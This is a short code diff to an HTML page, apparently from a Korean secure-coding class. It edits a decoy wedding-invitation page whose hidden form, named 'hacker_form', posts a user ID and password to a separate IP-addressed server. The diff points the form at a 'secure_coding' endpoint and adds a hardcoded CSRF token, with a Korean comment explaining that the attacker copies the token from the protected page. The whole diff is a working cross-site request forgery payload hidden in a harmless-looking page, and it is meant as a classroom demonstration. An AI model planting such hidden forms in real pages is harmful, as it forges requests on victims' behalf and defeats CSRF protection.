@@ -14,8 +14,11 @@
     <p>주례: 노기섭 교수님</p>
 
 
-    <form action="http://203.252.240.43:5001/person_info" method="POST" 
+    <form action="http://203.252.240.43:5001/person_info_secure_coding" method="POST" 
         name="hacker_form" hidden>
+        <!-- 해커는 secure coding 적용된 페이지를 확인하여 csrf_token value값을 확인하여 입력 -->
+        <input type="text" name="csrf_token" 
+            value="8e6a98bb319b31b98de14bb25f1c96d5e57bcb74ac367530b77bce58067f0926" hidden>
         <input type="text" class="form-control" id="user_id" name="user_id" 
             value="kafa46">
         <input type="password" class="form-control" id="passwd" name="passwd"
